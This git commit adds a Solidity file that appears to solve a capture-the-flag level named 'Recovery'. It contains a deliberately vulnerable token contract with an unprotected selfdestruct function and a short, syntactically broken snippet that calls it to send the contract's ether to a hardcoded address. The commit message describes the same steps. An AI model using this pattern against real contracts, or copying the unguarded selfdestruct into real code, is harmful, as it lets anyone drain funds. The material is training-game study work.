1575365492f5a06354d19fb805240355b92b6f66
demis1997 <demis.konstantinou16@gmail.com>
2022-08-25 00:15:56 +0300

    contract code and solution code
    Self destruct can be used by anyone and the address of the contract can be found through etherscan so simply add the function to remix and call self destruct on the contract address to send yourself the funds

---
+++ recovery.sol
@@ -0,0 +1,50 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import '@openzeppelin/contracts/math/SafeMath.sol';
+//Contract:
+contract Recovery {
+
+  //generate tokens
+  function generateToken(string memory _name, uint256 _initialSupply) public {
+    new SimpleToken(_name, msg.sender, _initialSupply);
+  
+  }
+}
+
+contract SimpleToken {
+
+  using SafeMath for uint256;
+  // public variables
+  string public name;
+  mapping (address => uint) public balances;
+
+  // constructor
+  constructor(string memory _name, address _creator, uint256 _initialSupply) public {
+    name = _name;
+    balances[_creator] = _initialSupply;
+  }
+
+  // collect ether in return for tokens
+  receive() external payable {
+    balances[msg.sender] = msg.value.mul(10);
+  }
+
+  // allow transfers of tokens
+  function transfer(address _to, uint _amount) public { 
+    require(balances[msg.sender] >= _amount);
+    balances[msg.sender] = balances[msg.sender].sub(_amount);
+    balances[_to] = _amount;
+  }
+
+  // clean up after ourselves
+  function destroy(address payable _to) public {
+    selfdestruct(_to);
+  }
+}
+
+//solution
+
+    function destruction() external {
+        simply.destroy(0x89a91a6c91E6c11C229A3C314f25b42c42A8B9F1);
+    }
